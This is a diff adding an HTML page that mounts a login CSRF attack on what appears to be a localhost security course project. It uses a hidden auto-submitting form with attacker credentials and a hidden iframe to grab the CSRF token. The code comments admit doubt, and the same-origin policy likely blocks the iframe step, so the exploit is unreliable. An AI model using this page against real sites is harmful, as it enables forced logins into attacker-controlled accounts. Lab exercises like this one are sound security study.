@@ -1,0 +1,47 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title></title>
+</head>
+<body>
+<!-- Use a form that auto-submits via JavaScript -->
+<form id="csrfForm" method="POST" action="http://localhost/project2/login?csrfdefense=1&xssdefense=4" style="display: none;">
+    <input type="hidden" name="username" value="attacker">
+    <input type="hidden" name="password" value="badguy4">
+    <input type="hidden" name="csrf" value="">
+</form>
+
+<script>
+// First, we need to get a valid CSRF token
+// We'll use an image tag to make a request and read the cookie
+// But since we can't read cookies cross-origin, we need a different approach
+
+// Let's try to exploit the fact that the token might be predictable or reusable
+// Or we can use a timing attack to get a fresh token
+
+// Alternative: Load the page in an iframe and hope same-origin policy allows access
+const iframe = document.createElement('iframe');
+iframe.src = 'http://localhost/project2/?csrfdefense=1&xssdefense=4';
+iframe.style.display = 'none';
+
+iframe.onload = function() {
+    setTimeout(() => {
+        // Try to access the iframe content
+        try {
+            const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+            const tokenInput = iframeDoc.querySelector('input[name="csrf"]');
+            if (tokenInput) {
+                document.getElementById('csrfForm').querySelector('input[name="csrf"]').value = tokenInput.value;
+                document.getElementById('csrfForm').submit();
+            }
+        } catch (e) {
+            // If CORS blocks direct access, try the redirect chain approach
+            window.location.href = 'http://localhost/project2/?csrfdefense=1&xssdefense=4';
+        }
+    }, 500);
+};
+
+document.body.appendChild(iframe);
+</script>
+</body>
+</html>
